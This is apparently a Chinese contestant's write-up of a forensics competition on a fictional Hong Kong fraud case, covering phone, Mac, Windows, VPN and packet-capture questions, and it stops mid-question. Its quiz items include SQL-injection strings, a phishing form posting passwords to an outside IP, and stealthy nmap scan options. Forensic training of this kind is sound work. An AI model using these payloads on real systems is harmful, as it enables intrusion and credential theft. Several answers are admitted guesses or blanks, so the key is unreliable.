[{"content":"案件基本情况 案情 2023月8月的一天，香港警方在调查一起网络诈骗案件时，发现有三名本地男子，分別为李大輝（李大辉），浩賢(浩贤)和Elvis CHUI，并确信这三名被捕男子均为大学同学。怀疑三人背后涉及一个庞大的电信诈骗集团。于是将这三名本地男子拘捕，扣押了三人相关的电子设备并进行分析。 现在你被委派处理这件案件，请依据以下资料分析上述三人是否涉嫌犯罪，并还原事件经过。\n检材资料 镜像挂载密码：\n3hqGFfT#B*Yjd74t@f%9fDqs6D^$wVjAvxZkA79*4UV*kVRcq^Zu6Xp87W*p#X3XD%*ER!nHzzTnSEMwy8NEGX6A*%P\u0026amp;#rBUkxypAPKwX4mP3WZuHnYKRc7sA33hd@qS 1.李大輝的安卓手机镜像 (Android.bin) 2.李大輝的macOS系统镜像(Mac OS.img) 3.来自李大輝计算机的一个文件($MFT Record Nr_ 107115, SeqNr_2.txt) 4.浩賢的个人虚拟机文件(Server.zip) 5.浩賢的Windows 10系统虚拟机文件(Windows10.zip) 6.浩賢的iOS手机系统文件(IOS.zip) 7.来自Elvis Chui计算机的一个网络封包文件(網路.pcapng) 8.来自Elvis Chui计算机的镜像文件 (Windows Artifacts.e01) 9.来自Elvis Chui计算机的数据库文件(SQLITE.zip) 10.Elvis Chui的Windows7虚拟机文件(Windows7.zip)\n手机 1. [填空题] 李大辉所用手机移动运营商公司的名称是什么？提示:请所有字母都用大写英文 (1分) LGE *找错了\nLGE指的是LG Electronics（乐金电子/LG电子） 这个公司，它曾是主要的Android智能手机制造商，但在2021年，LG宣布退出全球手机业务，停止新的手机开发与销售\n总之这是手机制造商，而不是机移动运营商\n真正的运营商应该查看SIM卡：\n这个Mobile Duck是指中国移动香港（China Mobile Hong Kong, CMHK）旗下的 “鸭聊佳（Mobile Duck / 鴨聊佳） 预付费 / 储值卡服务品牌\nMOBILE DUCK 2. [单选题] 李大辉的手机安装了什么即时通讯软件？ (1分) A. WhatsApp B. LINE C. 微信 D. Signal E. QQ\n不是单选吗\nAC *错了\nwhatsapp有数据，而微信没有数据，那就说明只有whatsapp被使用了\u0026hellip;\u0026hellip;吗?\n挺奇怪的\nA 3. [填空题] 李大辉的手机安装了什么反追踪软件？提示: 所有答案字母都用小写字母并用xxx_xxx_xxxxxxx_xxxxxx_xxxx格式作答 (1分) 不知道\n*官方答案是air_tag_tracker_detect_lite\n这是什么，完全没看见他在哪里出现过，也没找到任何题解思路，呃呃了\nair_tag_tracker_detect_lite 4. [单选题] 李大辉的手机是什么时间成功登入WhatsApp？ (2分) A. 2022-08-18_21:52:30 B. 2022-08-19_21:56:23 C. 2022-08-18_21:56:37 D. 2022-08-19_06:59:07 E. 2022-08-19_07:01:17\n距离C最近\nC 5. [填空题] 李大辉登入WHATSAPP时的认证短码是什么？提示: 请以阿拉伯数字作答 (1分) 同上题图\n304-313 6. [单选题] 李大辉到美丽好化妆品公司的入职时间是何时？(2分) A. 2016-04-16 B. 2016-06-28 C. 2017-05-25 D. 2017-07-25 E. 2017-08-18\nC 7. [单选题] 李大辉曾于什么时间使用了图像编辑软件？ (2分) A. 2022-09-10 B. 2022-09-12 C. 2022-10-05 D. 2022-11-10 E. 2022-11-13\n不知道\n*在Android.bin/分区57/media/0/DCIM下有一张图片：\n可以看到修改时间和创建时间是不一样的，说明是被修改了\n但是答案没有2022-10-11这个选项，怀疑是D选项把月和日写反了\nVPN 8. [填空题] 这个访问服务器使用了哪个端口？提示: 请用阿拉伯数字作答 (1分) 明显是自己访问的自己，或许是在测试\n943 *在usr/local/openvpn_as/etc/db下能找到config_local.db配置文件：\n项号 键名 说明 1 run_api.active_profile Default 运行使用的 API 配置文件为 Default 1 webui.edit_profile Default Web 管理界面使用的配置文件（Default） 2 host.name 218.255.242.114 服务器的公网 IP 地址或主机名（客户端连接时会显示这个地址） 2 admin_ui.https.ip_address ens33 管理后台（Web Admin UI）绑定的网络接口（ens33） 2 admin_ui.https.port 943 管理后台 HTTPS 端口（默认 943）\n可通过 https://\u0026lt;IP\u0026gt;:943/admin 登录 2 cs.https.ip_address ens33 “Client Service” Web UI 绑定接口\n用户从浏览器访问 https://\u0026lt;IP\u0026gt;:943/ 下载配置时用 2 cs.https.port 943 同样监听在 943 端口\nAdmin 与 Client 共用端口 2 vpn.daemon.0.listen.ip_address ens33 VPN 守护进程监听的网卡接口 2 vpn.daemon.0.server.ip_address all 表示该 VPN 服务器允许所有 IP 客户端连接（不做源限制） 2 vpn.daemon.0.listen.port 443 OpenVPN 服务监听的端口（默认 TCP/UDP 443，用于穿透防火墙） 2 vpn.client.routing.reroute_gw true 客户端连接后将默认网关重定向到 VPN（即所有流量走 VPN） 2 vpn.client.routing.reroute_dns true 客户端连接后 DNS 请求也通过 VPN 2 vpn.server.routing.private_access nat VPN 内部子网与外部网络通过 NAT 转换 2 vpn.server.daemon.tcp.port 443 TCP 模式的 OpenVPN 守护进程使用 443 端口 2 vpn.server.daemon.tcp.n_daemons 4 开启 4 个 TCP 守护线程（提升并发性能） 2 vpn.server.daemon.udp.n_daemons 4 开启 4 个 UDP 守护线程 2 vpn.server.routing.private_network.0 192.168.112.0/24 VPN 内部虚拟网段（分配给客户端的 IP 范围） 2 vpn.server.daemon.protocols both 同时支持 TCP 和 UDP 2 vpn.server.routing.gateway_access true 允许客户端访问服务器所在网段 2 vpn.server.daemon.ovpndco true 启用 OpenVPN Data Channel Offload（优化性能） 2 vpn.client.routing.inter_client true 允许客户端之间互相访问（默认是隔离的） 这里就能看出来端口号了\n943 9. [填空题] “User1”账户最近连接到这个访问服务器时使用的IP地址是多少？提示: 用IPV4 格式回答 (1分) 果然找到了openvpnas.log，一共两个，导出搜索\n203.198.117.194 *又做错了\n我找的是openvpnas.log.1，答案在openvpnas.log，因为它更早，题目问的是最近连接\n192.166.244.167 10. [多选题] 哪些文件可以找出这个访问服务器的Ubuntu版本？(1分) A. lsb-release B. issue.net C. profile D. console\nAB 11. [多选题] 哪些文件有助于分辨这是一个存储服务器？(1分) A. auth.log B. sys.log C. bash_history D. idconfig\n但是C里面什么也没有，所以应该是\nAB 12. [单选题] 这个访问服务器所在时区是哪个时区？(2分) A. UTC +9 B. UTC +8 C. UTC -7 D. UTC\nC 13. [填空题] 这个访问服务器的“openvpn”帐户密码是多少？提示:请用大写字母与阿拉伯数字作答 (2分) 见第八题\nTLFAG6l6DSSC 14. [单选题] 在这个访问服务器中，“User1”账户之间的连接所使用的加密算法（密码）是什么？(2分) A. Blowfish-CBC B. 3DES-CBC C. AES-128-GCM D. AES-256-CBC\n在openvpnas.log.1里面搜索四个选项，发现CD都能搜得到\nC *又做错了\nUser1的OpenVPN设置文件是user1.ovpn，路径不好确定，直接搜名称，或者后缀.opvn\n里面就定义了使用的加密算法：\nD 流量 15. [填空题] 给出正在进行Nmap扫瞄的计算机互联网协议地址？提示: 以IPV4格式给出答案 (1分) 参考文章：nmap流量特征及其用法详细 192.168.186.132 16. [填空题] 有多少个Nmap扫瞄正在同时进行？提示:请给出阿拉伯数字作答 (1分) TCP扫描里面时不时穿插UDP扫描，应该是至少有两个，具体怎么判断不清楚\n2 *通过icmp协议查找\n在wireshark过滤icmp，可以看见有两组request和reply，在网络抓包中，这一对请求‑回应就构成了一次完整的探测事件，通过目标ip也能看出确实是之前看到的两次扫描的ip\n不过，许多主机或防火墙直接丢弃ICMP Echo Request/Reply，导致看不到reply，会误判为未响应或扫描未完成，所以这种方法似乎是不太可靠的\n但放在这题也能用吧\n2 17. [单选题] 当计算机正在扫瞄8.8.8.8，namp相关的指令是什么？(1分) A. nmap -sT 8.8.8.8 B. nmap -sU 8.8.8.8 C. nmap -sn -PR 8.8.8.8 D. nmap -sn -PU 8.8.8.8\nA 18. [单选题] 当计算机正在扫瞄45.33.32.156，namp相关的指令是什么？(1分) A. nmap -sT 45.33.32.156 B. nmap -sU 45.33.32.156 C. nmap -sn -45.33.32.156 D. nmap -sn -45.33.32.156\nB 19. [单选题] 国强被指派设定一个DHCP服务器，该服务器需借出最后100个的IP地址，以下哪个IP地址会是被借出的IP地址？(1分) A. 10.1.4.255\nB. 10.1.4.100\nC. 10.1.4.254\nD. 10.1.4.1\n和检材应该没什么关系\n最后100个IP地址：从10.1.4.155到10.1.4.254\nA. 10.1.4.255 → 广播地址，不可分配\nB. 10.1.4.100 → 不在最后 100 个\nC. 10.1.4.254 → 在最后 100 个 ✅\nD. 10.1.4.1 → 网络第一个可用地址，不在最后 100 个\nC 20. [单选题] 以下那个协议是属于TCP/IP协议？(1分) i.DHCP **ii.HTTP ** iii.RTP iv.Telnet\n**A. i \u0026amp; iii **\n**B. ii \u0026amp; iv **\n**C. 所有皆是 (All answers belong to TCP/IP protocol) **\nD. 所有皆否(All answers don’t belong to TCP/IP protocol)\nDHCP → TCP/IP 协议族下的应用层协议，用于动态分配 IP 地址 HTTP → TCP/IP 协议族下的应用层协议，用于网页通信 RTP → 实时传输协议，通常运行在 UDP 之上，也是 TCP/IP 协议族下的应用层协议 Telnet → TCP/IP 协议族下的应用层协议，用于远程登录 所以全部都是\nC 21. [单选题] 浩贤为一间公司的网络管理员，他需要把一个路由器作出以下设定，现在浩贤把路由器作以下设定，志伟是浩贤的主管，他发现浩贤的设定错误，浩贤应作怎样的更正？(2分) A. \u0026lsquo;access-list 123 permit tcp any eq ftp any ’ 更正为(change) \u0026lsquo;access-list 123 permit udp any eq ftp any ’\nB. \u0026lsquo;access-list 122 permit tcp host 192.168.26.3 eq www any ’ 更正为(change) \u0026lsquo;access-list 122 permit udp host 192.168.26.3 eq www any ’\nC. 删除(Delete)‘access-list 120 deny tcp any any’ 与’access-list 119 deny udp any any’\nD. 删除(Delete)\u0026lsquo;access-list 123 permit tcp any eq ftp any ’\nA：FTP 是 TCP 协议（21/20端口），而不是 UDP，将 TCP 改为 UDP 是错误的，会导致 FTP 被阻挡\nB：WWW（HTTP）是 TCP 协议（端口 80），改成 UDP 是错误的，会阻止 HTTP\nC：如果这两条 ACL 阻止了所有 TCP 和 UDP 流量，会导致网络服务全部阻断，删除这些 deny 语句可以恢复正常访问\nD：这是允许 FTP 的规则，不应删除，否则 FTP 无法访问\nC 22. [单选题] 根据以下ping指令的结果，你会估计192.168.186.132是哪一个操作系统？(2分) Ping 192.168.186.132 (使用32字节的数据): 回复自 192.168.186.132 F=32 d)\u0026lt;1ms TTL=64 回复自 192.168.186.132 F55=32 didl\u0026lt;1ms TTL=64 回复自192.168.186.132: F15=32 Mii) \u0026lt; 1ms TTL=64 回复自 192.168.186.132: F5=32 Bi)\u0026lt;1ms TTL=64 Ping 192.168.186.132 with 32 bytes of data Reply from 192.168.186.132: byte=32 time \u0026lt;1ms TTL=64 Reply from 192.168.186.132: byte=32 time \u0026lt;1ms TTL=64 Reply from 192.168.186.132: byte=32 time \u0026lt;1ms TTL=64 Reply from 192.168.186.132: byte=32 time \u0026lt;1ms TTL=64) **A. Linux **\n**B. Windows XP **\n**C. Windows 7 **\nD. iOS 12.4 (Cisco Routers)\n要判断操作系统，需要看ping 的 ICMP 响应特征，通常包括：\nTTL 值（Time To Live） ICMP 包大小（默认数据长度） 是否支持分片、是否返回“Destination unreachable”等信息 不同操作系统的默认 TTL 值大致如下：\n操作系统 默认 TTL 值 Linux 64 Windows XP 128 Windows 7/10 128 iOS / Cisco 64 / 255 题中TTL是64\nA 23. [单选题] 当使用nmap扫瞄目标后，nmap内出现以下信息，应用哪一个指令找出开放的端口？(2分) A. nmap -sT\nB. nmap -sN\nC. nmap -sX\nD. nmap -Pn\n要列出开放的 TCP 端口，最直接的是做 TCP connect 扫描（-sT），它会完成三次握手并报告哪些端口被接受（开放）\nA 24.[单选题] 以下哪一个Nmap指令可以减低被侦测的可能性？(2分) A. nmap -sT -O -T5\nB. nmap -sT -O -T0\nC. nmap -sU\nD. nmap -A \u0026ndash;host-timeout 99-T1\n在选项里 -T0（极慢、最谨慎）能最大程度降低被检测的可能性（慢速发送、间隔大，躲避速率/阈值检测）\nB Mac OS 25. [单选题] Apple计算机的硬盘可以使用以下分区方案：(1分) A. Apple Partition Map\nB. GUID Partition Table\nC. Master Boot Record\nD. All of the above\nApple 计算机的硬盘支持的分区方案有：\nApple Partition Map (APM) → 老式 Mac（PowerPC）使用 GUID Partition Table (GPT) → Intel Mac 以及现代 macOS 使用 Master Boot Record (MBR) → 兼容 Windows 或旧式 BIOS 系统 D 26.[单选题]‘Mac OS.img’文件中可以找到多少个符号链接？(1分) A. 0\nB. 1\nC. 2\nD. 3\n不知道怎么看，因为火眼扫不出来，从这之后除了27题都不会做，直接跳到windows部分了\n它只是一个可挂载的移动存储设备分区，缺少完整的系统，所以火眼不能自动分析\n果然离开工具啥也不是了，之后想办法补补，比如Xways这样的手动分析，唉唉\n*这一题还是不知道怎么做\n27. [单选题] 在’Mac OS.img’ 档中使用了哪种分区方案？(2分) A. Apple Partition Map\nB. GUID Partition Table\nC. Master Boot Record\nD. HFS+\n这个还是能看出来的，有HFS+ Private Data，也不能是别的了\nD *错了\n唉，还以为能做出一题来\n将img文件用Xways打开，能看见具体的分区方案：\n这题说实话是我傻波一了，问的是分区方案不是分区系统，纯眼瞎\nB 28. [单选题] ‘Mac OS.img’ 档的文件系统的正确描述是什么？(1分) A. HFS+（已启用日志记录）\nB. HFS+（已启用区分大小写）\nC. HFS+（已启用日志记录和区分大小写）\nD. APFS (已启用区分大小写）\n在xway的专业工具 -\u0026gt; 技术细节报告能看见开启了日志记录：\n不过区分大小写不知道怎么判断\n29. [填空题] 从文件“Car.rtfd”中删除了哪个文件？提示:答案需包括副文件名，并以全小写字母作答，例如 answer.docx (1分) *用文件系统日志的内容对比当前有的东西：\n少了yeah.jpg\nyeah.jpg 30. [填空题] 请提供’Mac OS.img’ 映像文件被“fsck”命令检查的具体时间。(1分) 31. [单选题] 在 .img 档中删除了多少个文件？(1分) A. 1\nB. 2\nC. 3\nD. 4\n*查看回收站\n.Trashes是macOS的回收站目录，里面有四个文件，但.DS_Store是配置文件，所以实际只有三个：\n但还要加上之前发现的被删掉的yeah.jpg，所以一共是4个\nD windows 32. [填空题] Elvis Chui 总共登入过该计算机多少次？根据 ‘Window Artifacts.E01’ 内的Windows 注册表记录 (1分) 11 33. [单选题] 该计算机的操作系统是在哪一个时区？(1分) A. UTC +4\nB. UTC +8\nC. UTC -8\nD. UTC -4\n注册表HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\TimeZoneInformation里是时区信息：\nB 34. [单选题] 该计算机的操作系统于何时安装？(以计算机系统时区回答) (1分) A. 2023-07-13 19:18:14 B. 2023-07-13 11:18:14 C. 2023-07-13 03:18:14 D. 2023-07-12 19:18:14\nC 35. *[多选题] 哪(几)个程序会于操作系统启动时自动执行？(1分) A. Avast B. Steam C. OneDrive D. QQ\nABC 36. [单选题] 该计算机内安装了以下哪一个程序？(1分) A. QQ B. WPS Office C. Opera D. Kaspersky\nB 37. [填空题] 计算机内的OneDrive程序版本是什么？(1分) 21.220.1024.0005 38. [填空题] 计算机有一个正在连接的网络接口，该接口连接DHCP服务器的IP地址是多少？提示: 以 IPV4格式回答 (1分) 虚拟机使用ipconfig /all能看见只有Ethemet0网卡在工作，但是看不见DHCP服务器的地址，在火眼能找到：\n192.168.88.254 39. [单选题] 该计算机何时连接过一只U盘？(以计算机系统时区回答) (1分) A. 2023-07-13 11:48:26 B. 2023-07-13 03:48:29 C. 2023-07-12 19:48:29 D. 2023-07-13 11:48:29\n与选项D最接近\nD 40. [多选题] Elvis Chui 将哪几个文本文件放在回收站中？(3分) A. $+D10I76A74P.txt\nB. Holiday schedule 2023-07-16.txt\nC. Holiday schedule 2023-07-13.txt\nD. Minute on 2023-07-01.txt\nE. Minute on 2023-07-10.txt\nBE 41. [单选题] Elvis Chui在什么时间删除了第一个文本文件？(以计算机系统时区回答) (3分) A. 2023-07-13 11:50:15 B. 2023-07-13 03:49:45 C. 2023-07-13 03:50:15 D. 2023-07-13 11:49:45\nD 42. [填空题] Elvis Chui删除的第一个文本文件的文件名是什么？提示: 请用小写字母回答及需列明文件格式。如文件名字内有空格位置，请用_标示。例如: go_to_school.docx (2分) Holiday_schedule_2023-07-16.txt 43. [单选题] Elvis Chui删除的第一个文本文件在什么时间创建？(以计算机系统时区回答) (2分) A. 2023-07-13_11:42:39 B. 2023-07-13_11:50:49 C. 2023-07-13_11:49:45 D. 2023-07-13_11:45:22\n还原看属性：\nD 44.[填空题] Elvis Chui计划于2023年7月15日20点5分有什么活动？提示: 答案请与文件内的文字与大细阶相同 (1分 回收站里面还有一个十五号的txt，还原里面有日程：\nMoive 45. [填空题] 该计算机执行STEAM.EXE总共多少次？提示: 请用阿拉伯数字作答 (1分) 没找到\u0026hellip;\n之前长安杯的经验是错误的，应该在火眼的预执行文件里找：\n7 Web知识 46. [单选题] 一个名为“Account”的数据库表拥有5个\u0026quot;列\u0026quot;，以下哪一个指令会产生错误讯息？ (提示: 1.数据库是拥有正常默认的系统表格 2.错误信息是关于\u0026quot;超出上限\u0026quot;的错误) (1分) A. SELECT * from Account WHERE name=‘Alex’ OR ‘1’=1\nB. SELECT * FROM Account WHERE name=‘Bill’ UNION SELECT NULL, NULL, NULL, NULL\nC. SELECT * from Account WHERE name=‘Candy’ ORDER BY 6\nD. SELECT name FROM sys.tables\nC选项order by 6但表只有五列，超出了上限，B也报错但不是超出上限错误\nC 47. [单选题] 当客户端收到一个页面请求的HTTP状态代码为304时，以下哪种情况最有可能发生？(1分) A. 页面将显示错误\nB. 页面将从浏览器缓存中加载\nC. 浏览器将显示“访问被拒绝”\nD. 服务器将复位向客户端到另一个资源\nHTTP状态码304 Not Modified (未修改) 是服务器对客户端的条件请求的回应，它告诉浏览器，自上次请求以来，其缓存的资源版本没有发生任何变化\n因此浏览器不需要从服务器重新下载资源，而是可以直接使用本地缓存中的版本，这样可以节省带宽并加快页面加载速度\nB 48. [单选题] 在HTML注入攻击中，以下哪种情况最有可能出现？(1分) A. \u0026lt;form action=\u0026quot;http://1.2.3.4/login.htm\u0026quot;\u0026gt;Password:\u0026lt;input type=\u0026quot;password\u0026quot; name=\u0026quot;pword\u0026quot;\u0026gt; \u0026lt;/form\u0026gt;\nB. \u0026lt;embed src=\u0026quot;http://demo.com/demo.swf\u0026quot;\u0026gt; \u0026lt;/embed\u0026gt;\nC. \u0026lt;script\u0026gt;alert(‘Correct’)\u0026lt;/script\u0026gt;\nD. \u0026lt;?php include(“inc/\u0026quot; .$_GET[‘file’]；?\u0026gt;\nHTML注入攻击的核心是向易受攻击的页面中插入恶意的HTML代码，以改变页面的外观或功能\nA注入了一个伪造的登录表单来钓鱼\nA 49. [单选题] 如何预防HTML注入攻击？(1分) **A. 密钥管理 **\n**B. 同源策略执行 **\n**C. 会话验证 **\nD. 输入过滤\nHTML注入的根本原因是应用程序未经验证或未正确处理就将用户输入的数据包含在输出的HTML页面中，比如评论之类的地方，过滤用户输入就能防御了\nD 50. [单选题] 同源策略在浏览器内存中提供Web应用程序安全的目的是什么？(3分) A. 防止客户端访问恶意网站\nB. 禁止Web会话运行外部脚本\nC. 控制来自不同服务器的代码之间的交互\nD. 阻止浏览器运行危险或有害的脚本\n同源策略规定一个源的脚本只能读取和操作来自同一源的资源，主要目的就是隔离来自不同源的文档或脚本，防止恶意脚本读取或篡改其他源的敏感数据\nC 51. [填空题] 编写Nmap命令以显示以下结果。(2分) Starting Nmap 7.94 (https://nmap.org) at 2023-07-11 18:26 中国标准时间 Nmap scan report for www.baidu.com (220.181.38.149) Host is up (0.044s latency). Other addresses for www.baidu.com (not scanned): 220.181.38.150 Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http | http-robots.txt: 10 disallowed entries | /baidu /s? /ulink? /link? /home/news/data/ /bh /shifen/ |_/homepage/ /cpro / 443/tcp open https | http-robots.txt: 10 disallowed entries | /baidu /s? /ulink? /link? /home/news/data/ /bh /shifen/ |_/homepage/ /cpro / Nmap done: 1 IP address (1 host up) scanned in 6.01 seconds 输出显示了http-robots.txt的内容\nnmap --script http-robots.txt www.baidu.com 52. [填空题] 除了使用Nmap，还有其他方法可以验证上述结果，其中一种方法是使用Web浏览器浏览URL，编写URL以显示上述结果。（答案不要包含“http://”）(2分) www.baidu.com/robots.txt ios 53. [单选题] 根据 ’ com.apple.ios.StoreKitUIService.plist ’ , 这部电话是什么型号？(1分) A. SAMSUNG S23\nB. iPhone X\nC. iPhone XR\nD. iPhone XS\nE. iPhone 13\n不知道为什么火眼不能查看完整的.plist文件，这里使用plisteditor查看：\n这个款硬件网上能搜到：\nC 54. [单选题] 根据com.apple.ios.StoreKitUIService.plist，上述电话的文件系统是什么？(1分) A. FAT32\nB. NTFS\nC. HFS+\nD. APFS\nE. EXT4\n现代iOS设备从iOS 10起就使用APFS文件系统，尤其是iPhone XR/iPhone 8之后的设备\nD 55. [多选题] 根据ChatStorage.sqlite，哪些对话已锁定？(3分) A. 447380449879@.whatsapp.net\nB. 79096209701@.whatsapp.net\nC. 923109725619@.whatsapp.net\nD. 85256026169@.whatsapp.net\nE. status@broadcast\n不知道怎么做\n56. [填空题] 根据ChatStorage.sqlite，有多少段录音对话？提示: 请以阿拉伯数字作答 (2分) 只能一个表一个表看，也不知道找的对不对：\n48 57. [单选题] Apple Cocoa Core Data timestamp 是由什么时间开始？(1分) A. 2001年1月1日 B. 1970年1月1日 C. 2006年1月1日 D. 1960年1月1日\nA 58.[填空题] 根据Photos.sqlite数据库中，有多少段视频可能涉及WhatsApp？提示: 请以阿拉伯数字作答 (2分) 7 59. [多选题] 根据Photos.sqlite数据库中，下列哪个选项对IMG_0008.HEIC的描述是错的？(3分) A. 由第三方软件拍摄\nB. 经过修改\nC. 由后镜拍摄\nD. 用ISO200拍摄\nE. 没有储存经纬度\n在ZASSET表找到这一条数据：\n字段 值 说明 ZORIGINALCOLORSPACE Display P3 色彩空间信息 ZFILENAME IMG_0008.HEIC 文件名 ZUNIFORMTYPEIDENTIFIER public.heic 文件类型 ZLATITUDE / ZLONGITUDE 114.17077 / 22.27827833333333 经纬度 ZADJUSTMENTTIMESTAMP / ZHASADJUSTMENTS 706011358 / 1 有调整/修改 ZDERIVEDCAMERACAPTUREDEVICE 0 拍摄设备标识（0 一般表示 iPhone 后置摄像头） ZCAMERAPROCESSINGADJUSTMENTSTATE 0 后处理状态 ZISO 未提供 ISO 信息缺失 ADE 60. [填空题] 根据 ’ sms(ios).db ’ 的资料，全局唯一标识符(GUID): DD31C26F-1D72-DE0F-431E-EF98F104402D显示的信息是什么？提示:答案需要与信息一样(答案包括中文字、阿拉伯数字与符号) (1分) 你的 Uber 驗證碼為 3666. 請勿分享此驗證碼. 61. [多选题] 根据 ’ com.burbn.instagram.plist ’ 及 ’ com.facebook.Facebook.plist ’ 手机安装了实时通讯软件Facebook及Instagram的那个版本？(1分) A. Instagram (Version 278.0.0.19.115)\nB. Facebook (Version 410.0.0.41.116)\nC. Instagram (Version 279.0.0.23.112)\nD. Facebook (Version 410.0.0.26.115)\nE. Instagram (Version 278.0.0.25.115)\nF. Facebook (Version 410.0.0.57.116)\ncom.burbn.instagram.plist：\ncom.facebook.Facebook.plist：\nAB 62. [填空题] 根据 ’ ChatStorage(ios).sqlite ’ , 用户数据Peter Chow (85262012141)在什么日期和时间(以UTC +8时区)曾经通过实时通讯软件送出一个信息(内容为: I am already home)? 提示:以UTC +8时区作答,并以YYYY-MM-DD_HH:MM:SS格式作答 例如:2023-01-01_10:01:01 (答案无需输入UTC +8) (2分) 发送时间：702012111.6379331\n基准时间：2001-01-01 00:00:00 -\u0026gt; 978278400\n时间戳相加转换：\n2023-04-01_11:21:51 63. [填空题] 根据影片IMG_0687.MOV的原数据，找出影片拍摄时间？提示:以UTC +8时区作答,并以YYYY-MM-DD_HH:MM:SS格式作答 例如:2023-01-01_10:01:01 (答案无需输入UTC +8) (1分) IMG_0687.MOV在哪呢？？\n64. [单选题] 根据 ’ CallHistory(ios).storedata \u0026lsquo;，哪份表格显示了通话记录？(2分) A. ZCALLBPROPERTIES\nB. ZCALLRECORD\nC. Z_2REMOTEPARTICIPANTHANDLES\nD. Z_METADATA\nE. Z_MODELCACHE\nF. Z_PRIMARYKEY\nB 65. [填空题] 根据 ’ com.apple.sharingd.plist \u0026lsquo;，这部手机的隔空投送的身份标识号(AirDrop ID)是什么？提示:请以阿拉伯数字与小写字母作答 (3分) ![](http://picture.928330.xyz/typora/image-20251014225538877.png) 66. [填空题] 根据 ’ Accounts3.sqlite \u0026lsquo;，这部手机的苹果使用者账号 (Apple ID) 是什么？提示:请以电邮格式作答(例:jack2023@hotmail.com) (2分) 就这个出现的最多\nforatcd2023@gmail.com 组网运维 67. [单选题] 哪一行代码的是负责更新在GitHub使用中的 .journal 文件的更新历史记录？(1分) line 1 git config --global user.name \u0026#34;mikesezto\u0026#34; line 2 git config --global user.email \u0026#34;smike@general.org\u0026#34; line 3 line 4 cd which-truth line 5 rm .journal line 6 line 7 git add .journal line 8 git commit -m \u0026#34;Remove sensitive data\u0026#34; line 9 git push line 10 line 11 git clone --mirror http://github.com/smike/which-truth line 12 line 13 java -jar bfg.jar --delete-files .journal which-truth line 14 cd which-truth line 15 git reflog expire --expire=now --all line 16 git gc --prune=now --aggressive line 17 git push --force A. 08\nB. 13\nC. 16\nD. 17\n这个脚本的目的是从git的所有历史记录中彻底删除.journal文件\nline 13使用BFG Repo-Cleaner工具在本地重写了Git历史，清除了所有关于.journal文件的痕迹，然而，此时远程的GitHub仓库仍然保留着旧的历史记录\nline 17命令git push --force的作用是将本地被修改过的历史记录强制推送到GitHub，覆盖掉远程服务器上旧的历史记录，执行了这一步github上正在使用的历史记录才会被真正更新\nD 68. [单选题] 下列哪一行AWS S3 Bucket授权策略中的设置有问题？(1分) line 1 { line 2 \u0026#34;Version\u0026#34;: \u0026#34;2020-11-12\u0026#34;, line 3 \u0026#34;Statement\u0026#34;: [ line 4 { line 5 \u0026#34;Sid\u0026#34;: \u0026#34;PublicReadGetObject\u0026#34;, line 6 \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, line 7 \u0026#34;Principal\u0026#34;: \u0026#34;*\u0026#34;, line 8 \u0026#34;Action\u0026#34;: \u0026#34;s3:GetObject\u0026#34;, line 9 \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:s3:::company-sensitive-14dnid23nfief/*\u0026#34; line 10 } line 11 ] line 12 } A. 2\nB. 7\nC. 8\nD. 9\nline 7的\u0026quot;Principal\u0026quot;: \u0026quot;*\u0026quot;有问题，Principal定义了谁可以访问这个资源，而*是一个通配符，代表任何人，包括互联网上匿名的任意用户\nB 69. [单选题] 以下哪项是多重身份验证 (MFA) 的示例？(1分) A. PIN 码和软件令牌\nB. 指纹和视网膜扫描\nC. 用户名和密码\nD. 一次性短信代码和硬件令牌\n多重身份验证 (MFA) 要求用户提供至少两种不同类型的验证因素。验证因素通常分为三类：\n知识因素 (Something you know): 密码、PIN 码 拥有因素 (Something you have): 手机（用于接收短信）、硬件令牌、软件令牌 App 生物特征因素 (Something you are): 指纹、面部识别、视网膜扫描 A: PIN 码 (知识) + 软件令牌 (拥有) = 两种不同类型的因素，这是 MFA\nB: 指纹 (生物特征) + 视网膜扫描 (生物特征) = 属于同一种类型的因素\nC: 用户名和密码都属于知识因素\nD: 短信代码 (拥有) + 硬件令牌 (拥有) = 属于同一种类型的因素\nA 70. [单选题] AWS用家在户口网络进行设定，而这些设定会记录用户或第三者的活动。第 11 行代码中的设定可以找到哪些用户或第三者的活动信息？(2分) line 1 sudo yum install python-pip -y line 2 sudo pip install opencanary line 3 line 4 sudo opencanaryd --copyconfig line 5 line 6 opencanaryd --start line 7 line 8 line 9 sudo yun install jq -y line 10 line 11 jq -r .src_host /var/tmp/opencanary.log | grep -V ^$ | sort | uniq \u0026gt; -/sources.txt line 12 jq -r .logdata.USERNAME /var/tmp/opencanary.log | grep -V null | sort | uniq \u0026gt; -/usernames.txt line 13 jq -r .logdata.PASSWORD /var/tmp/opencanary.log | grep -V null | sort | uniq \u0026gt; -/passwords.txt A. User Name 用户的名称\nB. User Source 用户的来源\nC. Attacker Name 攻击者的名称\nD. Attacker Source 攻击者的来源\nopencanary是一个蜜罐工具，通过模拟易受攻击的服务来诱捕攻击者并记录他们的活动\nline 11的命令jq -r .src_host /var/tmp/opencanary.log ...正在处理opencanary的日志文件，jq -r .src_host的作用是从JSON格式的日志中提取src_host字段的值，src_host代表\u0026quot;source host\u0026quot;，即源主机的IP地址\n由于这是蜜罐的日志，记录的活动来源很可能就是攻击者的IP地址，因此，该命令提取的是攻击者的来源信息\nD 71. [单选题] AWS用户设置了一个VPC，IP地址范围为10.0.0.0-10.0.0.24。下列哪个 IP 地址用于 DNS？(2分) A. 10.0.0.0\nB. 10.0.0.1\nC. 10.0.0.2\nD. 10.0.0.3\n在任何AWS VPC 的子网 (Subnet) 中，AWS都会保留前四个和最后一个IP地址用于特定目的\n对于一个CIDR块（例如 10.0.0.0/24），保留规则如下：\n10.0.0.0: 网络地址 10.0.0.1: 预留给VPC路由器 10.0.0.2: 预留给亚马逊提供的DNS服务器 10.0.0.3: 预留给未来使用 10.0.0.255: 网络广播地址，AWS不支持，因此也被保留 C 72. [单选题] 以下哪种类型的云服务用于操作系统和网络？ (1分) A. 软件即服务\nB. 平台即服务\nC. 基础架构即服务\nD. 数据即服务\n基础架构即服务 (Infrastructure as a Service, IaaS) 提供了最核心的计算资源，如虚拟机、存储和网络。用户可以在这个基础上部署和运行自己的软件，包括操作系统和应用程序\n平台即服务 (PaaS) 通常已经包含了操作系统和网络，用户只管理应用程序和数据\n软件即服务 (SaaS) 提供的是完整的应用程序，用户无需关心任何底层技术\nC 73. [单选题] 以下哪项是Bastionhost的特点？ 